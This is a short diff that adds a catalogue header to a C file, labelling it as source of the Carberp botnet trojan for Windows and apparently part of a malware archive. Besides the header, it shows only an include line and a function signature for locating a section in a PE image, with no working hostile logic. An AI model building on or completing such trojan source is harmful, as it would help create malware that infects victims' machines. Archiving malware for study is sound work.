@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 #include "getsec.h"
 
 PIMAGE_SECTION_HEADER SearchSection(PVOID pvPEBase,LPCSTR lpName)
